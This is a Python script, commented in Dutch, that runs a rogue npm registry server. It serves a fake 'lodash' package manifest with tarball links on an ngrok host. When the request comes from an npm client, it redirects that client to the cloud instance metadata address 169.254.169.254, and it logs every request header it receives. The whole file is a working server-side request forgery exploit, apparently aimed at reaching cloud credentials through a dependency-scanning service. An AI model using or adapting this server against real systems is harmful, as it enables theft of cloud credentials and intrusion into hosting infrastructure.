import json
from http.server import HTTPServer, BaseHTTPRequestHandler

INTERNAL = "http://169.254.169.254/latest/meta-data/"

PACKUMENT = json.dumps({
    "name": "lodash",
    "dist-tags": {"latest": "4.18.0"},
    "versions": {
        "4.18.0": {
            "name": "lodash",
            "version": "4.18.0",
            "dist": {
                "tarball": "https://d511-84-30-51-191.ngrok-free.app/lodash/-/lodash-4.18.0.tgz",
                "shasum": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
            }
        },
        "4.17.21": {
            "name": "lodash",
            "version": "4.17.21",
            "dist": {
                "tarball": "https://d511-84-30-51-191.ngrok-free.app/lodash/-/lodash-4.17.21.tgz",
                "shasum": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
            }
        }
    }
}).encode()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get("User-Agent", "")
        print(f"\n[REQUEST] {self.path}")
        print(f"  User-Agent: {ua}")
        for k, v in self.headers.items():
            if k.lower() not in ("user-agent",):
                print(f"  {k}: {v}")

        is_npm = "npm/" in ua

        if is_npm:
            # npm client volgt redirects - stuur naar IMDS
            print(f"[!] npm client gedetecteerd -> redirect naar {INTERNAL}")
            self.send_response(301)
            self.send_header("Location", INTERNAL)
            self.end_headers()
        else:
            # excon/Ruby - stuur valide JSON zodat npm wordt gespawned
            print(f"[*] excon request -> valide packument teruggeven")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(PACKUMENT)))
            self.end_headers()
            self.wfile.write(PACKUMENT)

    def log_message(self, format, *args):
        pass

print("Server luistert op poort 9090...")
HTTPServer(("0.0.0.0", 9090), Handler).serve_forever()
